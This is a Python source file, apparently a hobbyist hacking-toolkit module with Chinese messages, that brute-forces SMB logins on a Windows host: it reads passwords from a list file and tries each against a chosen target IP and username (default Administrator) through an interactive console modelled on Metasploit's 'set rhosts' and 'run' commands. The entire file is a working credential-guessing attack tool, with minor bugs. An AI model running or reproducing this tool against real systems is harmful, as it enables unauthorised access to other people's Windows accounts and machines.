import fs.smbfs


def smb(target,username):
    print('开始破解')
    path = 'pwd.txt'
    file = open(path,'r')
    password_list = open('pwd.txt').read().splitlines()
    password = 'awa'
    
    try:
        win = fs.smbfs.SMBFS(host=target, username=username, passwd=password)#不断尝试密码
        
    except fs.errors.CreateFailed:
        print(f'[-]错误的主机IP:{target},连接超时!')
        return False
    
    for pwd in password_list:
        
        try:
            win = fs.smbfs.SMBFS(host=target, username=username, passwd=pwd,timeout=10)#不断尝试密码
        
        except:
            print('[-]密码错误:',+ str(pwd))
        
        else:
            print('[*]密码正确:', str(pwd))
            break
    return True

def smb_main(target,username):
    smb(target=target,username=username)
    return True

target = '0.0.0.0'
username = 'Administrator'
while True:
    cmd = input('T-BOX auxiliary(passwprd/windows) >')
    if cmd == 'show options':
        print('                                                          ')
        print('----------name---------content------------present---------')
        print('       rhosts      '+target+'             目标IP              ')
        print('       username     '+username+'          目标用户名             ')
        print('----------------------------------------------------------------')

    elif cmd[:10] == 'set rhosts':
        target = cmd[11:]
        print('[*]rhosts ==> '+ target)


    elif cmd[:12] == 'set username':
        username = cmd[13:]
        print('[*]username ==> '+ username)

    elif cmd == '':
        pass

    elif cmd == 'run':
        if target == '0.0.0.0':
            print('[-]请设置目标IP')
        else:
            print('[+]start.....')
            smb_main(target=target,username=username)
    elif cmd == 'back':
        break

    else:
        print("[-]can't find command: " + cmd)